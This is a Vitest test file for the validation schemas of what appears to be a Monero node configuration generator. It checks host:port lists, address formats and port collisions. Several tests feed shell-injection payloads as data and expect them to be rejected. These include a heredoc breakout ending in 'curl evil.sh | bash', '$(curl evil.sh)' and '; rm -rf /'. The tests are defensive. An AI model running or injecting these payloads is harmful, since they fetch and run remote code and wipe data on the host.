import { describe, expect, it } from "vitest";
import {
  hostPortSchema,
  hostListSchema,
  hostListStringSchema,
  numericStringSchema,
  signedNumericStringSchema,
  moneroAddressSchema,
  p2PoolPayoutAddressSchema,
  MONERO_ADDRESS_BASE58,
  MONERO_ADDRESS_REGEX,
  MONERO_PRIMARY_ADDRESS_PREFIX,
  isValidP2PoolPayoutAddress,
} from "./schemas";
import { fullConfigSchema, FullConfig } from "./config-schema";

describe("hostPortSchema", () => {
  it("accepts host:port as shown in the UI help text", () => {
    expect(hostPortSchema.safeParse("node.example.org:18080").success).toBe(true);
    expect(hostPortSchema.safeParse("peer1.example.org:18089").success).toBe(true);
  });

  it("accepts bare hosts without a port", () => {
    expect(hostPortSchema.safeParse("node.example.org").success).toBe(true);
    expect(hostPortSchema.safeParse("1.2.3.4").success).toBe(true);
  });

  it("accepts onion addresses with and without a port", () => {
    const onion = `${"a".repeat(56)}.onion`;
    expect(hostPortSchema.safeParse(onion).success).toBe(true);
    expect(hostPortSchema.safeParse(`${onion}:18084`).success).toBe(true);
  });

  it("rejects ports out of range", () => {
    expect(hostPortSchema.safeParse("node.example.org:65536").success).toBe(false);
    expect(hostPortSchema.safeParse("node.example.org:99999").success).toBe(false);
  });

  it("rejects non-numeric ports and shell metacharacters", () => {
    expect(hostPortSchema.safeParse("node.example.org:abc").success).toBe(false);
    expect(hostPortSchema.safeParse("node.example.org;rm -rf /").success).toBe(false);
  });
});

describe("hostListSchema", () => {
  it("accepts comma/space-separated host:port entries", () => {
    expect(hostListSchema.safeParse("peer1.example.org:18080,peer2.example.org:18089").success).toBe(true);
    expect(hostListSchema.safeParse("peer1.example.org:18080 peer2.example.org:18080").success).toBe(true);
  });

  it("rejects the whole list if any entry is invalid", () => {
    expect(hostListSchema.safeParse("peer1.example.org:18080,peer2.example.org:notaport").success).toBe(false);
  });
});

describe("hostListStringSchema", () => {
  it("keeps the string type (no transform) for valid host lists", () => {
    const result = hostListStringSchema.safeParse("peer1.example.org:18080,peer2.example.org:18089");
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data).toBe("peer1.example.org:18080,peer2.example.org:18089");
    }
  });

  it("accepts an empty string", () => {
    expect(hostListStringSchema.safeParse("").success).toBe(true);
  });

  it("rejects entries that are not valid host[:port]", () => {
    expect(hostListStringSchema.safeParse("peer1.example.org:18080,evil.com:notaport").success).toBe(false);
  });

  it("rejects heredoc-breakout / shell injection payloads", () => {
    expect(
      hostListStringSchema.safeParse("evil.com\nMONERO_COMPOSE_EOF\ncurl evil.sh | bash").success
    ).toBe(false);
    expect(hostListStringSchema.safeParse("$(curl evil.sh)").success).toBe(false);
    expect(hostListStringSchema.safeParse("a.com; rm -rf /").success).toBe(false);
  });
});

describe("numeric schemas", () => {
  it("numericStringSchema rejects -1", () => {
    expect(numericStringSchema.safeParse("-1").success).toBe(false);
  });

  it("signedNumericStringSchema accepts -1", () => {
    expect(signedNumericStringSchema.safeParse("-1").success).toBe(true);
    expect(signedNumericStringSchema.safeParse("32").success).toBe(true);
  });
});

describe("shared Monero address rule", () => {
  it("exposes a base58 charset without the excluded characters 0, O, I and l", () => {
    for (const c of "0OIl") {
      expect(MONERO_ADDRESS_BASE58, c).not.toContain(c);
    }
  });

  it("accepts a valid 95-character primary address", () => {
    expect(MONERO_ADDRESS_REGEX.test("4" + "A".repeat(94))).toBe(true);
  });

  it("rejects characters not in the Monero base58 alphabet (0, O, I, l)", () => {
    for (const bad of ["0", "O", "I", "l"]) {
      expect(MONERO_ADDRESS_REGEX.test("4" + bad + "A".repeat(93)), bad).toBe(false);
    }
  });

  it("rejects a wrong length even when all characters are valid", () => {
    expect(MONERO_ADDRESS_REGEX.test("4" + "A".repeat(93))).toBe(false);
    expect(MONERO_ADDRESS_REGEX.test("4" + "A".repeat(95))).toBe(false);
  });

  it("rejects prefixes other than 4 or 8", () => {
    for (const bad of ["1", "3", "9"]) {
      expect(MONERO_ADDRESS_REGEX.test(bad + "A".repeat(94)), bad).toBe(false);
    }
  });

  it("moneroAddressSchema rejects an invalid-character address with the charset message", () => {
    const parsed = moneroAddressSchema.safeParse("4" + "A".repeat(60) + "O" + "A".repeat(33));
    expect(parsed.success).toBe(false);
    if (!parsed.success) {
      expect(parsed.error.issues[0].message).toContain("contains invalid characters");
      expect(parsed.error.issues[0].message).toContain("0, O, I and l");
    }
  });

  it("exposes the primary-address prefix constant used by the P2Pool gate", () => {
    expect(MONERO_PRIMARY_ADDRESS_PREFIX).toBe("4");
  });

  it("isValidP2PoolPayoutAddress rejects an 8-prefixed 95-char subaddress but accepts a 4-prefixed primary", () => {
    const subaddress = "8" + "A".repeat(94);
    expect(MONERO_ADDRESS_REGEX.test(subaddress)).toBe(true);
    expect(isValidP2PoolPayoutAddress(subaddress)).toBe(false);
    expect(isValidP2PoolPayoutAddress("4" + "A".repeat(94))).toBe(true);
  });

  it("isValidP2PoolPayoutAddress rejects empty and invalid-character addresses", () => {
    expect(isValidP2PoolPayoutAddress("")).toBe(false);
    expect(isValidP2PoolPayoutAddress("4" + "O" + "A".repeat(93))).toBe(false);
  });
});

describe("p2PoolPayoutAddressSchema", () => {
  it("accepts a valid 95-character primary address", () => {
    expect(p2PoolPayoutAddressSchema.safeParse("4" + "A".repeat(94)).success).toBe(true);
  });

  it("rejects an 8-prefixed subaddress with a P2Pool-specific message", () => {
    const parsed = p2PoolPayoutAddressSchema.safeParse("8" + "A".repeat(94));
    expect(parsed.success).toBe(false);
    if (!parsed.success) {
      expect(parsed.error.issues[0].message).toContain("primary Monero address");
      expect(parsed.error.issues[0].message).toContain("subaddresses");
    }
  });

  it("rejects an invalid-character primary address", () => {
    expect(p2PoolPayoutAddressSchema.safeParse("4" + "O" + "A".repeat(93)).success).toBe(false);
  });

  it("accepts an empty string (payout optional when p2pool is off)", () => {
    expect(p2PoolPayoutAddressSchema.safeParse("").success).toBe(true);
  });

  it("accepts a whitespace-padded valid primary address (trim before refining)", () => {
    expect(p2PoolPayoutAddressSchema.safeParse("  " + "4" + "A".repeat(94) + "  ").success).toBe(
      true
    );
  });
});

const baseConfig = (): FullConfig => ({
  architecture: "linux/amd64",
    networkMode: "local",
    monerod: {
      isMoneroPublicNode: false,
      moneroNodeNoLogs: false,
      moneroNodeDomain: "node.example.com",
      isPrunedNode: false,
      isSyncPrunedBlocks: false,
      isMoneroMainnetVolume: true,
      moneroMainnetBlockchainLocation: "",
      logLevel: "0",
      maxLogFileSize: "104850000",
      maxLogFiles: "50",
      p2pBindPort: "18080",
      outPeers: "64",
      inPeers: "32",
      limitRateUp: "1048576",
      limitRateDown: "2048",
      hidePort: false,
      allowLocalIp: false,
      maxConnectionsPerIp: "1",
      p2pExternalPort: "0",
      offlineMode: false,
      padTransactions: false,
      anonymousInbound: "",
      txProxyDisableNoise: false,
      banList: "",
      enableDnsBlocklist: false,
      dnsCheckpoints: "default",
      seedNode: "",
      addPeer: "",
      addPriorityNode: "",
      addExclusiveNode: "",
      dbSyncMode: "",
      blockSyncSize: "0",
      fastBlockSync: true,
      preparationThreads: "4",
      maxConcurrency: "0",
      bootstrapDaemonAddress: "",
      bootstrapDaemonLogin: "",
      zmqPubEnabled: false,
      zmqPubBindPort: "18083",
      rpcLogin: "",
      disableRpcBan: false,
      maxTxpoolWeight: "0",
      startMining: "",
      miningThreads: "1",
      bgMiningEnable: false,
      bgMiningIgnoreBattery: false,
      blockNotify: "",
      reorgNotify: "",
      blockRateNotify: "",
    },
    stagenet: {
      isStagenetNode: false,
      isStagenetNodePublic: false,
      isMoneroStagenetCustomLocation: false,
      moneroStagenetBlockchainLocation: "",
      stagenetNodeDomain: "stagenet.example.com",
    },
    p2pool: { p2PoolMode: "none", p2PoolPayoutAddress: "", p2PoolMiningThreads: 1, isP2PoolStratumPublic: false },
    mining: { miningMode: "none", xmrigDonateLevel: 1 },
    tor: {
      torProxyMode: "none",
      hsMonerod: false,
      hsMonerodP2P: false,
      hsStagenet: false,
      hsP2Pool: false,
      hsGrafana: false,
      isGlobalTorProxy: false,
    },
    services: {
      isMoneroWalletRpc: false,
      isWatchtower: false,
      isMonitoring: false,
      grafanaDomain: "grafana.example.com",
      isTraefik: false,
      isTraefikMonerod: false,
      isTraefikStagenet: false,
      isTraefikGrafana: false,
      isTraefikPortainer: false,
      isPortainer: false,
      portainerDomain: "portainer.example.com",
      isCuprateEnabled: false,
    },
    enabledBashServices: { monitoring: false, cuprate: false },
  });

describe("full config server-side validation", () => {
  it("accepts host:port for seed node and bootstrap daemon (fix 1)", () => {
    const config = baseConfig();
    config.monerod.seedNode = "node.example.org:18080";
    config.monerod.bootstrapDaemonAddress = "bootstrap.example.org:18089";
    expect(fullConfigSchema.safeParse(config).success).toBe(true);
  });

  it("accepts -1 for peers and rate limits (fix 5)", () => {
    const config = baseConfig();
    config.monerod.outPeers = "-1";
    config.monerod.inPeers = "-1";
    config.monerod.limitRateUp = "-1";
    config.monerod.limitRateDown = "-1";
    expect(fullConfigSchema.safeParse(config).success).toBe(true);
  });

  it("accepts each DNS checkpoint mode and rejects anything else (fix 6)", () => {
    for (const mode of ["default", "skip", "enforce"] as const) {
      const config = baseConfig();
      config.monerod.dnsCheckpoints = mode;
      expect(fullConfigSchema.safeParse(config).success, mode).toBe(true);
    }
    const config = baseConfig();
    config.monerod.dnsCheckpoints = "bogus" as FullConfig["monerod"]["dnsCheckpoints"];
    expect(fullConfigSchema.safeParse(config).success).toBe(false);
  });

  it("rejects script-injection payloads in the host-list peer fields", () => {
    for (const field of ["addPeer", "addPriorityNode", "addExclusiveNode"] as const) {
      const config = baseConfig();
      config.monerod[field] =
        "evil.com\nMONERO_COMPOSE_EOF\ncurl evil.sh | bash";
      const result = fullConfigSchema.safeParse(config);
      expect(result.success, field).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0].path).toEqual(["monerod", field]);
      }
    }
  });

  it("accepts valid host lists in the host-list peer fields", () => {
    const config = baseConfig();
    config.monerod.addPeer = "peer1.example.org:18080, 1.2.3.4:18080";
    config.monerod.addPriorityNode = `${"a".repeat(56)}.onion:18084`;
    config.monerod.addExclusiveNode = "";
    expect(fullConfigSchema.safeParse(config).success).toBe(true);
  });
});

const parseP2pBindPort = (config: FullConfig) => {
  const result = fullConfigSchema.safeParse(config);
  return {
    success: result.success,
    issuePath: result.success ? undefined : result.error.issues[0]?.path,
  };
};

describe("monerod P2P bind port collision validation", () => {
  it("rejects a P2P port colliding with the RPC ports monerod binds inside the container", () => {
    for (const port of ["18081", "18089"]) {
      const config = baseConfig();
      config.monerod.p2pBindPort = port;
      const { success, issuePath } = parseP2pBindPort(config);
      expect(success, `p2pBindPort ${port}`).toBe(false);
      expect(issuePath).toEqual(["monerod", "p2pBindPort"]);
    }
  });

  it("rejects a P2P port colliding with the active ZMQ port when ZMQ is enabled", () => {
    const config = baseConfig();
    config.monerod.zmqPubEnabled = true;
    config.monerod.zmqPubBindPort = "18090";
    config.monerod.p2pBindPort = "18090";
    expect(parseP2pBindPort(config).success).toBe(false);
  });

  it("rejects the default ZMQ port when p2pool mode is active", () => {
    const config = baseConfig();
    config.p2pool.p2PoolMode = "mini";
    config.monerod.p2pBindPort = "18083";
    expect(parseP2pBindPort(config).success).toBe(false);
  });

  it("rejects the default ZMQ port when monitoring is enabled", () => {
    const config = baseConfig();
    config.services.isMonitoring = true;
    config.monerod.p2pBindPort = "18083";
    expect(parseP2pBindPort(config).success).toBe(false);
  });

  it("accepts a P2P port that collides with no in-container bind", () => {
    for (const port of ["18080", "18082", "18083", "18084", "18090"]) {
      const config = baseConfig();
      config.monerod.p2pBindPort = port;
      expect(parseP2pBindPort(config).success, `p2pBindPort ${port}`).toBe(true);
    }
  });

  it("accepts the default ZMQ port when ZMQ is effectively off", () => {
    const config = baseConfig();
    config.monerod.p2pBindPort = "18083";
    expect(parseP2pBindPort(config).success).toBe(true);
  });

  it("treats p2pool's ZMQ need as satisfied by the default port even when ZMQ is enabled on a custom port", () => {
    const config = baseConfig();
    config.p2pool.p2PoolMode = "mini";
    config.monerod.zmqPubEnabled = true;
    config.monerod.zmqPubBindPort = "18090";
    config.monerod.p2pBindPort = "18083";
    expect(parseP2pBindPort(config).success).toBe(true);
    config.monerod.p2pBindPort = "18090";
    expect(parseP2pBindPort(config).success).toBe(false);
  });
});

describe("monerod ZMQ publisher port collision validation", () => {
  it("rejects a ZMQ port colliding with the RPC ports monerod binds inside the container", () => {
    for (const port of ["18081", "18089"]) {
      const config = baseConfig();
      config.monerod.zmqPubEnabled = true;
      config.monerod.zmqPubBindPort = port;
      const { success, issuePath } = parseP2pBindPort(config);
      expect(success, `zmqPubBindPort ${port}`).toBe(false);
      expect(issuePath).toEqual(["monerod", "zmqPubBindPort"]);
    }
  });

  it("rejects a custom ZMQ port colliding with the effective P2P port", () => {
    const config = baseConfig();
    config.monerod.zmqPubEnabled = true;
    config.monerod.zmqPubBindPort = "18085";
    config.monerod.p2pBindPort = "18085";
    const result = fullConfigSchema.safeParse(config);
    expect(result.success).toBe(false);
    if (result.success) return;
    const zmqIssue = result.error.issues.find(
      (issue) => issue.path.join(".") === "monerod.zmqPubBindPort"
    );
    expect(zmqIssue).toBeDefined();
  });

  it("rejects a custom ZMQ port colliding even when the stack forces ZMQ on (regression)", () => {
    const config = baseConfig();
    config.p2pool.p2PoolMode = "full";
    config.monerod.zmqPubBindPort = "18089";
    const { success, issuePath } = parseP2pBindPort(config);
    expect(success).toBe(false);
    expect(issuePath).toEqual(["monerod", "zmqPubBindPort"]);
  });

  it("accepts a ZMQ port that collides with nothing monerod binds inside the container", () => {
    const config = baseConfig();
    config.monerod.zmqPubEnabled = true;
    config.monerod.zmqPubBindPort = "18090";
    expect(parseP2pBindPort(config).success).toBe(true);
  });

  it("accepts a ZMQ port that would collide while ZMQ is effectively off", () => {
    const config = baseConfig();
    config.monerod.zmqPubEnabled = false;
    config.monerod.zmqPubBindPort = "18089";
    expect(parseP2pBindPort(config).success).toBe(true);
  });
});

describe("p2pool payout address server-side validation", () => {
  it("rejects an 8-prefixed subaddress payout address", () => {
    const config = baseConfig();
    config.p2pool.p2PoolMode = "mini";
    config.p2pool.p2PoolPayoutAddress = "8" + "A".repeat(94);
    const result = fullConfigSchema.safeParse(config);
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.issues[0].path).toEqual(["p2pool", "p2PoolPayoutAddress"]);
    }
  });

  it("accepts a valid primary payout address", () => {
    const config = baseConfig();
    config.p2pool.p2PoolMode = "mini";
    config.p2pool.p2PoolPayoutAddress = "4" + "A".repeat(94);
    expect(fullConfigSchema.safeParse(config).success).toBe(true);
  });

  it("accepts an empty payout address when p2pool is active but the mode is none", () => {
    const config = baseConfig();
    config.p2pool.p2PoolPayoutAddress = "";
    expect(fullConfigSchema.safeParse(config).success).toBe(true);
  });
});
